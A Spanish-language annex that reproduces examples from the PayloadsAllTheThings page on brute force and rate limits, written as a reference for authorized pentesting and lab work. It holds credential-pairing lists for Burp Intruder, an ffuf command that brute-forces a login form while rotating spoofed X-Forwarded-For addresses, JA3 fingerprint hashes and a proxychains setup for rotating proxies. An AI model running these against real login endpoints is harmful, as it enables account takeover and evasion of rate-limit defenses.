# Límites insuficientes de recursos en API: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [Brute Force Rate Limit/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/Brute%20Force%20Rate%20Limit/README.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Bruteforce / Burp Suite Intruder

```ps1
    Username: password
    Username1:Password1
    Username1:Password2
    Username1:Password3
    Username1:Password4
```

```ps1
    Username1:Username1
    Username2:Username2
    Username3:Username3
    Username4:Username4
```

```ps1
    Username1:Password1
    Username2:Password2
    Username3:Password3
    Username4:Password4
```

```ps1
    Username1:Password1
    Username1:Password2
    Username1:Password3
    Username1::Password4

    Username2:Password1
    Username2:Password2
    Username2:Password3
    Username2:Password4
```

## 2. Bruteforce / FFUF

```bash
ffuf -w usernames.txt:USER -w passwords.txt:PASS \
     -u https://target.tld/login \
     -X POST -d "username=USER&password=PASS" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -H "X-Forwarded-For: FUZZ" -w ipv4-list.txt:FUZZ \
     -mc all
```

## 3. Límite de solicitudes / TLS Stack - JA3

### Variantes presentes en tablas o texto del apartado

```text
53d67b2a806147a7d1d5df74b54dd049
62f6a6727fda5a1104d5b147cd82e520
e7d705a3286e19ea42f587b344ee6865
```

## 4. Límite de solicitudes / Network IPv4

```bash
proxychains ffuf -w wordlist.txt -u https://target.tld/FUZZ
```

```ps1
    random_chain
```

```ps1
    chain_len = 1
```

```ps1
    # type  host      port
    socks5  127.0.0.1 1080
    socks5  192.168.1.50 1080
    http    proxy1.example.com 8080
    http    proxy2.example.com 8080
```

### Variantes presentes en tablas o texto del apartado

```text
random_chain
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
